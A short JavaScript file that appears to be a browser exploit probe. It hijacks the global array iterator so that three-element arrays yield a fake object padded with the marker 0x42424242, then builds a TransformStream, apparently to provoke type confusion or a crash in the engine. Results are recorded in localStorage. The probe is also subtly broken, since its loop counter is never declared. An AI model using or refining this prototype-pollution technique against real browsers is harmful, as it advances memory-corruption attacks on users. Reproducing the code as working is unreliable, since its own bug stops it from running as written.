try {
    Array.prototype[Symbol.iterator] = function() {
        const arr = this;

        return {
            next() {
                if (i >= arr.length)
                    return { done: true };
                let val = arr[i];
                if (arr.length === 3 && i >= 1) {
                    localStorage.setItem('crash_result', 'CRASH_AT_INDEX_' + i);
                    // غيّرنا القيمة إلى 0x42424242
                    val = { fake: true, pad: 0x42424242 };
                }
                i++;
                return { value: val, done: false };
            }
        };
    };

    new TransformStream();
    
} catch(e) {
    localStorage.setItem('crash_result', 'CAUGHT: ' + e.message);
}
Array.prototype[Symbol.iterator] = [][Symbol.iterator];
